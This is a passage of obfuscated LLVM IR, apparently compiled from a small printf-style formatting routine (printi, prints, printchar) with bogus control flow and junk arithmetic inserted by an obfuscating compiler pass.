  %520 = phi i32* [ %488, %originalBBpart296 ], [ %509, %originalBBpart2100 ]
  %521 = load i32, i32* %520, align 4
  %522 = load i32, i32* %7, align 4
  %523 = load i32, i32* %8, align 4
  %524 = call i32 @printi(i8** %463, i32 %521, i32 10, i32 0, i32 %522, i32 %523, i32 97)
  %525 = load i32, i32* %9, align 4
  %526 = add nsw i32 %525, %524
  store i32 %526, i32* %9, align 4
  br label %667

; <label>:527:                                    ; preds = %originalBBpart285
  %528 = load i8*, i8** %5, align 8
  %529 = load i8, i8* %528, align 1
  %530 = zext i8 %529 to i32
  %531 = icmp eq i32 %530, 99
  br i1 %531, label %532, label %609

; <label>:532:                                    ; preds = %527
  %533 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %534 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %533, i32 0, i32 0
  %535 = load i32, i32* %534, align 8
  %536 = icmp ule i32 %535, 40
  br i1 %536, label %537, label %559

; <label>:537:                                    ; preds = %532
  %538 = load i32, i32* @x.7
  %539 = load i32, i32* @y.8
  %540 = sub i32 %538, 1
  %541 = mul i32 %538, %540
  %542 = urem i32 %541, 2
  %543 = icmp eq i32 %542, 0
  %544 = icmp slt i32 %539, 10
  %545 = or i1 %543, %544
  br i1 %545, label %originalBB102, label %originalBB102alteredBB

originalBB102:                                    ; preds = %originalBB102alteredBB, %537
  %546 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %533, i32 0, i32 3
  %547 = load i8*, i8** %546, align 8
  %548 = getelementptr i8, i8* %547, i32 %535
  %549 = bitcast i8* %548 to i32*
  %550 = add i32 %535, 8
  store i32 %550, i32* %534, align 8
  %551 = load i32, i32* @x.7
  %552 = load i32, i32* @y.8
  %553 = sub i32 %551, 1
  %554 = mul i32 %551, %553
  %555 = urem i32 %554, 2
  %556 = icmp eq i32 %555, 0
  %557 = icmp slt i32 %552, 10
  %558 = or i1 %556, %557
  br i1 %558, label %originalBBpart2119, label %originalBB102alteredBB

originalBBpart2119:                               ; preds = %originalBB102
  br label %580

; <label>:559:                                    ; preds = %532
  %560 = load i32, i32* @x.7
  %561 = load i32, i32* @y.8
  %562 = sub i32 %560, 1
  %563 = mul i32 %560, %562
  %564 = urem i32 %563, 2
  %565 = icmp eq i32 %564, 0
  %566 = icmp slt i32 %561, 10
  %567 = or i1 %565, %566
  br i1 %567, label %originalBB121, label %originalBB121alteredBB

originalBB121:                                    ; preds = %originalBB121alteredBB, %559
  %568 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %533, i32 0, i32 2
  %569 = load i8*, i8** %568, align 8
  %570 = bitcast i8* %569 to i32*
  %571 = getelementptr i8, i8* %569, i32 8
  store i8* %571, i8** %568, align 8
  %572 = load i32, i32* @x.7
  %573 = load i32, i32* @y.8
  %574 = sub i32 %572, 1
  %575 = mul i32 %572, %574
  %576 = urem i32 %575, 2
  %577 = icmp eq i32 %576, 0
  %578 = icmp slt i32 %573, 10
  %579 = or i1 %577, %578
  br i1 %579, label %originalBBpart2123, label %originalBB121alteredBB

originalBBpart2123:                               ; preds = %originalBB121
  br label %580

; <label>:580:                                    ; preds = %originalBBpart2123, %originalBBpart2119
  %581 = phi i32* [ %549, %originalBBpart2119 ], [ %570, %originalBBpart2123 ]
  %582 = load i32, i32* @x.7
  %583 = load i32, i32* @y.8
  %584 = sub i32 %582, 1
  %585 = mul i32 %582, %584
  %586 = urem i32 %585, 2
  %587 = icmp eq i32 %586, 0
  %588 = icmp slt i32 %583, 10
  %589 = or i1 %587, %588
  br i1 %589, label %originalBB125, label %originalBB125alteredBB

originalBB125:                                    ; preds = %originalBB125alteredBB, %580
  %590 = load i32, i32* %581, align 4
  %591 = trunc i32 %590 to i8
  %592 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %591, i8* %592, align 1
  %593 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %593, align 1
  %594 = load i8**, i8*** %4, align 8
  %595 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %596 = load i32, i32* %7, align 4
  %597 = load i32, i32* %8, align 4
  %598 = call i32 @prints(i8** %594, i8* %595, i32 %596, i32 %597)
  %599 = load i32, i32* %9, align 4
  %600 = add nsw i32 %599, %598
  store i32 %600, i32* %9, align 4
  %601 = load i32, i32* @x.7
  %602 = load i32, i32* @y.8
  %603 = sub i32 %601, 1
  %604 = mul i32 %601, %603
  %605 = urem i32 %604, 2
  %606 = icmp eq i32 %605, 0
  %607 = icmp slt i32 %602, 10
  %608 = or i1 %606, %607
  br i1 %608, label %originalBBpart2135, label %originalBB125alteredBB

originalBBpart2135:                               ; preds = %originalBB125
  br label %667

; <label>:609:                                    ; preds = %527
  %610 = load i32, i32* @x.7
  %611 = load i32, i32* @y.8
  %612 = sub i32 %610, 1
  %613 = mul i32 %610, %612
  %614 = urem i32 %613, 2
  %615 = icmp eq i32 %614, 0
  %616 = icmp slt i32 %611, 10
  %617 = or i1 %615, %616
  br i1 %617, label %originalBB137, label %originalBB137alteredBB

originalBB137:                                    ; preds = %originalBB137alteredBB, %609
  %618 = load i32, i32* @x.7
  %619 = load i32, i32* @y.8
  %620 = sub i32 %618, 1
  %621 = mul i32 %618, %620
  %622 = urem i32 %621, 2
  %623 = icmp eq i32 %622, 0
  %624 = icmp slt i32 %619, 10
  %625 = or i1 %623, %624
  br i1 %625, label %originalBBpart2139, label %originalBB137alteredBB

originalBBpart2139:                               ; preds = %originalBB137
  br label %666

; <label>:626:                                    ; preds = %33
  %627 = load i32, i32* @x.7
  %628 = load i32, i32* @y.8
  %629 = sub i32 %627, 1
  %630 = mul i32 %627, %629
  %631 = urem i32 %630, 2
  %632 = icmp eq i32 %631, 0
  %633 = icmp slt i32 %628, 10
  %634 = or i1 %632, %633
  br i1 %634, label %originalBB141, label %originalBB141alteredBB

originalBB141:                                    ; preds = %originalBB141alteredBB, %626
  %635 = load i32, i32* @x.7
  %636 = load i32, i32* @y.8
  %637 = sub i32 %635, 1
  %638 = mul i32 %635, %637
  %639 = urem i32 %638, 2
  %640 = icmp eq i32 %639, 0
  %641 = icmp slt i32 %636, 10
  %642 = or i1 %640, %641
  br i1 %642, label %originalBBpart2143, label %originalBB141alteredBB

originalBBpart2143:                               ; preds = %originalBB141
  br label %643

; <label>:643:                                    ; preds = %originalBBpart2143, %67
  %644 = load i32, i32* @x.7
  %645 = load i32, i32* @y.8
  %646 = sub i32 %644, 1
  %647 = mul i32 %644, %646
  %648 = urem i32 %647, 2
  %649 = icmp eq i32 %648, 0
  %650 = icmp slt i32 %645, 10
  %651 = or i1 %649, %650
  br i1 %651, label %originalBB145, label %originalBB145alteredBB

originalBB145:                                    ; preds = %originalBB145alteredBB, %643
  %652 = load i8**, i8*** %4, align 8
  %653 = load i8*, i8** %5, align 8
  %654 = load i8, i8* %653, align 1
  %655 = zext i8 %654 to i32
  call void @printchar(i8** %652, i32 %655)
  %656 = load i32, i32* %9, align 4
  %657 = add nsw i32 %656, 1
  store i32 %657, i32* %9, align 4
  %658 = load i32, i32* @x.7
  %659 = load i32, i32* @y.8
  %660 = sub i32 %658, 1
  %661 = mul i32 %658, %660
  %662 = urem i32 %661, 2
  %663 = icmp eq i32 %662, 0
  %664 = icmp slt i32 %659, 10
  %665 = or i1 %663, %664
  br i1 %665, label %originalBBpart2153, label %originalBB145alteredBB

originalBBpart2153:                               ; preds = %originalBB145
  br label %666

; <label>:666:                                    ; preds = %originalBBpart2153, %originalBBpart2139
  br label %667

; <label>:667:                                    ; preds = %666, %originalBBpart2135, %519, %originalBBpart281, %originalBBpart258, %originalBBpart234, %208
  %668 = load i8*, i8** %5, align 8
  %669 = getelementptr inbounds i8, i8* %668, i32 1
  store i8* %669, i8** %5, align 8
  br label %12

; <label>:670:                                    ; preds = %45, %originalBBpart2
  %671 = load i8**, i8*** %4, align 8
  %672 = icmp ne i8** %671, null
  br i1 %672, label %673, label %692

; <label>:673:                                    ; preds = %670
  %674 = load i32, i32* @x.7
  %675 = load i32, i32* @y.8
  %676 = sub i32 %674, 1
  %677 = mul i32 %674, %676
  %678 = urem i32 %677, 2
  %679 = icmp eq i32 %678, 0
  %680 = icmp slt i32 %675, 10
  %681 = or i1 %679, %680
  br i1 %681, label %originalBB155, label %originalBB155alteredBB

originalBB155:                                    ; preds = %originalBB155alteredBB, %673
  %682 = load i8**, i8*** %4, align 8
  %683 = load i8*, i8** %682, align 8
  store i8 0, i8* %683, align 1
  %684 = load i32, i32* @x.7
  %685 = load i32, i32* @y.8
  %686 = sub i32 %684, 1
  %687 = mul i32 %684, %686
  %688 = urem i32 %687, 2
  %689 = icmp eq i32 %688, 0
  %690 = icmp slt i32 %685, 10
  %691 = or i1 %689, %690
  br i1 %691, label %originalBBpart2157, label %originalBB155alteredBB

originalBBpart2157:                               ; preds = %originalBB155
  br label %692

; <label>:692:                                    ; preds = %originalBBpart2157, %670
  %693 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %694 = bitcast %struct.__va_list_tag* %693 to i8*
  call void @llvm.va_end(i8* %694)
  %695 = load i32, i32* %9, align 4
  ret i32 %695

originalBBalteredBB:                              ; preds = %originalBB, %12
  %696 = load i8*, i8** %5, align 8
  %697 = load i8, i8* %696, align 1
  %698 = zext i8 %697 to i32
  %699 = icmp ne i32 %698, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %46
  %700 = load i8*, i8** %5, align 8
  %701 = load i8, i8* %700, align 1
  %702 = zext i8 %701 to i32
  %703 = icmp eq i32 %702, 37
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %73
  %704 = load i8*, i8** %5, align 8
  %705 = getelementptr inbounds i8, i8* %704, i32 1
  store i8* %705, i8** %5, align 8
  store i32 1, i32* %8, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %93
  %706 = load i8*, i8** %5, align 8
  %707 = load i8, i8* %706, align 1
  %708 = zext i8 %707 to i32
  %709 = icmp eq i32 %708, 48
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %160
  %710 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %150, i32 0, i32 2
  %711 = load i8*, i8** %710, align 8
  %712 = bitcast i8* %711 to i32*
  %713 = getelementptr i8, i8* %711, i32 8
  store i8* %713, i8** %710, align 8
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %181
  %714 = load i32, i32* %182, align 4
  %715 = sext i32 %714 to i64
  %716 = inttoptr i64 %715 to i8*
  store i8* %716, i8** %11, align 8
  %717 = load i8**, i8*** %4, align 8
  %718 = load i8*, i8** %11, align 8
  %719 = icmp ne i8* %718, null
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %220
  %720 = load i8**, i8*** %4, align 8
  %721 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %722 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %721, i32 0, i32 0
  %723 = load i32, i32* %722, align 8
  %724 = icmp ule i32 %723, 40
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %253
  %725 = load i32, i32* %254, align 4
  %726 = load i32, i32* %7, align 4
  %727 = load i32, i32* %8, align 4
  %728 = call i32 @printi(i8** %229, i32 %725, i32 10, i32 1, i32 %726, i32 %727, i32 97)
  %729 = load i32, i32* %9, align 4
  %_ = sub i32 %729, %728
  %gen = mul i32 %_, %728
  %_27 = sub i32 %729, %728
  %gen28 = mul i32 %_27, %728
  %_29 = sub i32 %729, %728
  %gen30 = mul i32 %_29, %728
  %_31 = sub i32 0, %729
  %gen32 = add i32 %_31, %728
  %730 = add nsw i32 %729, %728
  store i32 %730, i32* %9, align 4
  br label %originalBB26

originalBB36alteredBB:                            ; preds = %originalBB36, %288
  %731 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %284, i32 0, i32 3
  %732 = load i8*, i8** %731, align 8
  %733 = getelementptr i8, i8* %732, i32 %286
  %734 = bitcast i8* %733 to i32*
  %_37 = sub i32 0, %286
  %gen38 = add i32 %_37, 8
  %_39 = sub i32 0, %286
  %gen40 = add i32 %_39, 8
  %735 = add i32 %286, 8
  store i32 %735, i32* %285, align 8
  br label %originalBB36

originalBB44alteredBB:                            ; preds = %originalBB44, %310
  %736 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %284, i32 0, i32 2
  %737 = load i8*, i8** %736, align 8
  %738 = bitcast i8* %737 to i32*
  %739 = getelementptr i8, i8* %737, i32 8
  store i8* %739, i8** %736, align 8
  br label %originalBB44

originalBB48alteredBB:                            ; preds = %originalBB48, %331
  %740 = load i32, i32* %332, align 4
  %741 = load i32, i32* %7, align 4
  %742 = load i32, i32* %8, align 4
  %743 = call i32 @printi(i8** %283, i32 %740, i32 16, i32 0, i32 %741, i32 %742, i32 97)
  %744 = load i32, i32* %9, align 4
  %_49 = sub i32 %744, %743
  %gen50 = mul i32 %_49, %743
  %_51 = sub i32 %744, %743
  %gen52 = mul i32 %_51, %743
  %_53 = sub i32 %744, %743
  %gen54 = mul i32 %_53, %743
  %_55 = shl i32 %744, %743
  %_56 = shl i32 %744, %743
  %745 = add nsw i32 %744, %743
  store i32 %745, i32* %9, align 4
  br label %originalBB48

originalBB60alteredBB:                            ; preds = %originalBB60, %366
  %746 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %362, i32 0, i32 3
  %747 = load i8*, i8** %746, align 8
  %748 = getelementptr i8, i8* %747, i32 %364
  %749 = bitcast i8* %748 to i32*
  %_61 = shl i32 %364, 8
  %_62 = shl i32 %364, 8
  %_63 = shl i32 %364, 8
  %750 = add i32 %364, 8
  store i32 %750, i32* %363, align 8
  br label %originalBB60

originalBB67alteredBB:                            ; preds = %originalBB67, %388
  %751 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %362, i32 0, i32 2
  %752 = load i8*, i8** %751, align 8
  %753 = bitcast i8* %752 to i32*
  %754 = getelementptr i8, i8* %752, i32 8
  store i8* %754, i8** %751, align 8
  br label %originalBB67

originalBB71alteredBB:                            ; preds = %originalBB71, %409
  %755 = load i32, i32* %410, align 4
  %756 = load i32, i32* %7, align 4
  %757 = load i32, i32* %8, align 4
  %758 = call i32 @printi(i8** %361, i32 %755, i32 16, i32 0, i32 %756, i32 %757, i32 65)
  %759 = load i32, i32* %9, align 4
  %_72 = shl i32 %759, %758
  %_73 = shl i32 %759, %758
  %_74 = sub i32 %759, %758
  %gen75 = mul i32 %_74, %758
  %_76 = sub i32 0, %759
  %gen77 = add i32 %_76, %758
  %_78 = sub i32 %759, %758
  %gen79 = mul i32 %_78, %758
  %760 = add nsw i32 %759, %758
  store i32 %760, i32* %9, align 4
  br label %originalBB71

originalBB83alteredBB:                            ; preds = %originalBB83, %433
  %761 = load i8*, i8** %5, align 8
  %762 = load i8, i8* %761, align 1
  %763 = zext i8 %762 to i32
  %764 = icmp eq i32 %763, 117
  br label %originalBB83

originalBB87alteredBB:                            ; preds = %originalBB87, %454
  %765 = load i8**, i8*** %4, align 8
  %766 = load %struct.__va_list_tag*, %struct.__va_list_tag** %6, align 8
  %767 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %766, i32 0, i32 0
  %768 = load i32, i32* %767, align 8
  %769 = icmp ule i32 %768, 40
  br label %originalBB87

originalBB91alteredBB:                            ; preds = %originalBB91, %476
  %770 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 3
  %771 = load i8*, i8** %770, align 8
  %772 = getelementptr i8, i8* %771, i32 %466
  %773 = bitcast i8* %772 to i32*
  %_92 = shl i32 %466, 8
  %_93 = sub i32 %466, 8
  %gen94 = mul i32 %_93, 8
  %774 = add i32 %466, 8
  store i32 %774, i32* %465, align 8
  br label %originalBB91

originalBB98alteredBB:                            ; preds = %originalBB98, %498
  %775 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %464, i32 0, i32 2
  %776 = load i8*, i8** %775, align 8
  %777 = bitcast i8* %776 to i32*
  %778 = getelementptr i8, i8* %776, i32 8
  store i8* %778, i8** %775, align 8
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %537
  %779 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %533, i32 0, i32 3
  %780 = load i8*, i8** %779, align 8
  %781 = getelementptr i8, i8* %780, i32 %535
  %782 = bitcast i8* %781 to i32*
  %_103 = sub i32 %535, 8
  %gen104 = mul i32 %_103, 8
  %_105 = sub i32 0, %535
  %gen106 = add i32 %_105, 8
  %_107 = shl i32 %535, 8
  %_108 = sub i32 0, %535
  %gen109 = add i32 %_108, 8
  %_110 = sub i32 0, %535
  %gen111 = add i32 %_110, 8
  %_112 = sub i32 %535, 8
  %gen113 = mul i32 %_112, 8
  %_114 = shl i32 %535, 8
  %_115 = shl i32 %535, 8
  %_116 = shl i32 %535, 8
  %_117 = shl i32 %535, 8
  %783 = add i32 %535, 8
  store i32 %783, i32* %534, align 8
  br label %originalBB102

originalBB121alteredBB:                           ; preds = %originalBB121, %559
  %784 = getelementptr inbounds %struct.__va_list_tag, %struct.__va_list_tag* %533, i32 0, i32 2
  %785 = load i8*, i8** %784, align 8
  %786 = bitcast i8* %785 to i32*
  %787 = getelementptr i8, i8* %785, i32 8
  store i8* %787, i8** %784, align 8
  br label %originalBB121

originalBB125alteredBB:                           ; preds = %originalBB125, %580
  %788 = load i32, i32* %581, align 4
  %789 = trunc i32 %788 to i8
  %790 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 0
  store i8 %789, i8* %790, align 1
  %791 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i64 0, i64 1
  store i8 0, i8* %791, align 1
  %792 = load i8**, i8*** %4, align 8
  %793 = getelementptr inbounds [2 x i8], [2 x i8]* %10, i32 0, i32 0
  %794 = load i32, i32* %7, align 4
  %795 = load i32, i32* %8, align 4
  %796 = call i32 @prints(i8** %792, i8* %793, i32 %794, i32 %795)
  %797 = load i32, i32* %9, align 4
  %_126 = sub i32 0, %797
  %gen127 = add i32 %_126, %796
  %_128 = shl i32 %797, %796
  %_129 = sub i32 0, %797
  %gen130 = add i32 %_129, %796
  %_131 = sub i32 %797, %796
  %gen132 = mul i32 %_131, %796
  %_133 = shl i32 %797, %796
  %798 = add nsw i32 %797, %796
  store i32 %798, i32* %9, align 4
  br label %originalBB125

originalBB137alteredBB:                           ; preds = %originalBB137, %609
  br label %originalBB137

originalBB141alteredBB:                           ; preds = %originalBB141, %626
  br label %originalBB141

originalBB145alteredBB:                           ; preds = %originalBB145, %643
  %799 = load i8**, i8*** %4, align 8
  %800 = load i8*, i8** %5, align 8
  %801 = load i8, i8* %800, align 1
  %802 = zext i8 %801 to i32
  call void @printchar(i8** %799, i32 %802)
  %803 = load i32, i32* %9, align 4
  %_146 = sub i32 0, %803
  %gen147 = add i32 %_146, 1
  %_148 = sub i32 0, %803
  %gen149 = add i32 %_148, 1
  %_150 = sub i32 %803, 1
  %gen151 = mul i32 %_150, 1
  %804 = add nsw i32 %803, 1
  store i32 %804, i32* %9, align 4
  br label %originalBB145

originalBB155alteredBB:                           ; preds = %originalBB155, %673
  %805 = load i8**, i8*** %4, align 8
  %806 = load i8*, i8** %805, align 8
  store i8 0, i8* %806, align 1
  br label %originalBB155
}

; Function Attrs: noinline nounwind uwtable
define internal i32 @prints(i8**, i8*, i32, i32) #0 {
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i8*, align 8
  store i8** %0, i8*** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  store i32 %3, i32* %8, align 4
  store i32 0, i32* %9, align 4
  store i32 32, i32* %10, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %13, 0
  br i1 %14, label %15, label %122

; <label>:15:                                     ; preds = %4
  store i32 0, i32* %11, align 4
  %16 = load i8*, i8** %6, align 8
  store i8* %16, i8** %12, align 8
  br label %17

; <label>:17:                                     ; preds = %40, %15
  %18 = load i32, i32* @x.9
  %19 = load i32, i32* @y.10
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %17
  %26 = load i8*, i8** %12, align 8
  %27 = load i8, i8* %26, align 1
  %28 = icmp ne i8 %27, 0
  %29 = load i32, i32* @x.9
  %30 = load i32, i32* @y.10
  %31 = sub i32 %29, 1
  %32 = mul i32 %29, %31
  %33 = urem i32 %32, 2
  %34 = icmp eq i32 %33, 0
  %35 = icmp slt i32 %30, 10
  %36 = or i1 %34, %35
  br i1 %36, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %28, label %37, label %43

; <label>:37:                                     ; preds = %originalBBpart2
  %38 = load i32, i32* %11, align 4
  %39 = add nsw i32 %38, 1
  store i32 %39, i32* %11, align 4
  br label %40

; <label>:40:                                     ; preds = %37
  %41 = load i8*, i8** %12, align 8
  %42 = getelementptr inbounds i8, i8* %41, i32 1
  store i8* %42, i8** %12, align 8
  br label %17

; <label>:43:                                     ; preds = %originalBBpart2
  %44 = load i32, i32* %11, align 4
  %45 = load i32, i32* %7, align 4
  %46 = icmp sge i32 %44, %45
  br i1 %46, label %47, label %64

; <label>:47:                                     ; preds = %43
  %48 = load i32, i32* @x.9
  %49 = load i32, i32* @y.10
  %50 = sub i32 %48, 1
  %51 = mul i32 %48, %50
  %52 = urem i32 %51, 2
  %53 = icmp eq i32 %52, 0
  %54 = icmp slt i32 %49, 10
  %55 = or i1 %53, %54
  br i1 %55, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %47
  store i32 0, i32* %7, align 4
  %56 = load i32, i32* @x.9
  %57 = load i32, i32* @y.10
  %58 = sub i32 %56, 1
  %59 = mul i32 %56, %58
  %60 = urem i32 %59, 2
  %61 = icmp eq i32 %60, 0
  %62 = icmp slt i32 %57, 10
  %63 = or i1 %61, %62
  br i1 %63, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %68

; <label>:64:                                     ; preds = %43
  %65 = load i32, i32* %11, align 4
  %66 = load i32, i32* %7, align 4
  %67 = sub nsw i32 %66, %65
  store i32 %67, i32* %7, align 4
  br label %68

; <label>:68:                                     ; preds = %64, %originalBBpart24
  %69 = load i32, i32* @x.9
  %70 = load i32, i32* @y.10
  %71 = sub i32 %69, 1
  %72 = mul i32 %69, %71
  %73 = urem i32 %72, 2
  %74 = icmp eq i32 %73, 0
  %75 = icmp slt i32 %70, 10
  %76 = or i1 %74, %75
  br i1 %76, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %68
  %77 = load i32, i32* %8, align 4
  %78 = and i32 %77, 2
  %79 = icmp ne i32 %78, 0
  %80 = load i32, i32* @x.9
  %81 = load i32, i32* @y.10
  %82 = sub i32 %80, 1
  %83 = mul i32 %80, %82
  %84 = urem i32 %83, 2
  %85 = icmp eq i32 %84, 0
  %86 = icmp slt i32 %81, 10
  %87 = or i1 %85, %86
  br i1 %87, label %originalBBpart217, label %originalBB6alteredBB

originalBBpart217:                                ; preds = %originalBB6
  br i1 %79, label %88, label %105

; <label>:88:                                     ; preds = %originalBBpart217
  %89 = load i32, i32* @x.9
  %90 = load i32, i32* @y.10
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %88
  store i32 48, i32* %10, align 4
  %97 = load i32, i32* @x.9
  %98 = load i32, i32* @y.10
  %99 = sub i32 %97, 1
  %100 = mul i32 %97, %99
  %101 = urem i32 %100, 2
  %102 = icmp eq i32 %101, 0
  %103 = icmp slt i32 %98, 10
  %104 = or i1 %102, %103
  br i1 %104, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br label %105

; <label>:105:                                    ; preds = %originalBBpart221, %originalBBpart217
  %106 = load i32, i32* @x.9
  %107 = load i32, i32* @y.10
  %108 = sub i32 %106, 1
  %109 = mul i32 %106, %108
  %110 = urem i32 %109, 2
  %111 = icmp eq i32 %110, 0
  %112 = icmp slt i32 %107, 10
  %113 = or i1 %111, %112
  br i1 %113, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %105
  %114 = load i32, i32* @x.9
  %115 = load i32, i32* @y.10
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %122

; <label>:122:                                    ; preds = %originalBBpart225, %4
  %123 = load i32, i32* %8, align 4
  %124 = and i32 %123, 1
  %125 = icmp ne i32 %124, 0
  br i1 %125, label %203, label %126

; <label>:126:                                    ; preds = %122
  %127 = load i32, i32* @x.9
  %128 = load i32, i32* @y.10
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBB27, label %originalBB27alteredBB

originalBB27:                                     ; preds = %originalBB27alteredBB, %126
  %135 = load i32, i32* @x.9
  %136 = load i32, i32* @y.10
  %137 = sub i32 %135, 1
  %138 = mul i32 %135, %137
  %139 = urem i32 %138, 2
  %140 = icmp eq i32 %139, 0
  %141 = icmp slt i32 %136, 10
  %142 = or i1 %140, %141
  br i1 %142, label %originalBBpart229, label %originalBB27alteredBB

originalBBpart229:                                ; preds = %originalBB27
  br label %143

; <label>:143:                                    ; preds = %originalBBpart243, %originalBBpart229
  %144 = load i32, i32* @x.9
  %145 = load i32, i32* @y.10
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB31, label %originalBB31alteredBB

originalBB31:                                     ; preds = %originalBB31alteredBB, %143
  %152 = load i32, i32* %7, align 4
  %153 = icmp sgt i32 %152, 0
  %154 = load i32, i32* @x.9
  %155 = load i32, i32* @y.10
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBBpart233, label %originalBB31alteredBB

originalBBpart233:                                ; preds = %originalBB31
  br i1 %153, label %162, label %186

; <label>:162:                                    ; preds = %originalBBpart233
  %163 = load i8**, i8*** %5, align 8
  %164 = load i32, i32* %10, align 4
  call void @printchar(i8** %163, i32 %164)
  %165 = load i32, i32* %9, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %9, align 4
  br label %167

; <label>:167:                                    ; preds = %162
  %168 = load i32, i32* @x.9
  %169 = load i32, i32* @y.10
  %170 = sub i32 %168, 1
  %171 = mul i32 %168, %170
  %172 = urem i32 %171, 2
  %173 = icmp eq i32 %172, 0
  %174 = icmp slt i32 %169, 10
  %175 = or i1 %173, %174
  br i1 %175, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %167
  %176 = load i32, i32* %7, align 4
  %177 = add nsw i32 %176, -1
  store i32 %177, i32* %7, align 4
  %178 = load i32, i32* @x.9
  %179 = load i32, i32* @y.10
  %180 = sub i32 %178, 1
  %181 = mul i32 %178, %180
  %182 = urem i32 %181, 2
  %183 = icmp eq i32 %182, 0
  %184 = icmp slt i32 %179, 10
  %185 = or i1 %183, %184
  br i1 %185, label %originalBBpart243, label %originalBB35alteredBB

originalBBpart243:                                ; preds = %originalBB35
  br label %143

; <label>:186:                                    ; preds = %originalBBpart233
  %187 = load i32, i32* @x.9
  %188 = load i32, i32* @y.10
  %189 = sub i32 %187, 1
  %190 = mul i32 %187, %189
  %191 = urem i32 %190, 2
  %192 = icmp eq i32 %191, 0
  %193 = icmp slt i32 %188, 10
  %194 = or i1 %192, %193
  br i1 %194, label %originalBB45, label %originalBB45alteredBB

originalBB45:                                     ; preds = %originalBB45alteredBB, %186
  %195 = load i32, i32* @x.9
  %196 = load i32, i32* @y.10
  %197 = sub i32 %195, 1
  %198 = mul i32 %195, %197
  %199 = urem i32 %198, 2
  %200 = icmp eq i32 %199, 0
  %201 = icmp slt i32 %196, 10
  %202 = or i1 %200, %201
  br i1 %202, label %originalBBpart247, label %originalBB45alteredBB

originalBBpart247:                                ; preds = %originalBB45
  br label %203

; <label>:203:                                    ; preds = %originalBBpart247, %122
  br label %204

; <label>:204:                                    ; preds = %247, %203
  %205 = load i32, i32* @x.9
  %206 = load i32, i32* @y.10
  %207 = sub i32 %205, 1
  %208 = mul i32 %205, %207
  %209 = urem i32 %208, 2
  %210 = icmp eq i32 %209, 0
  %211 = icmp slt i32 %206, 10
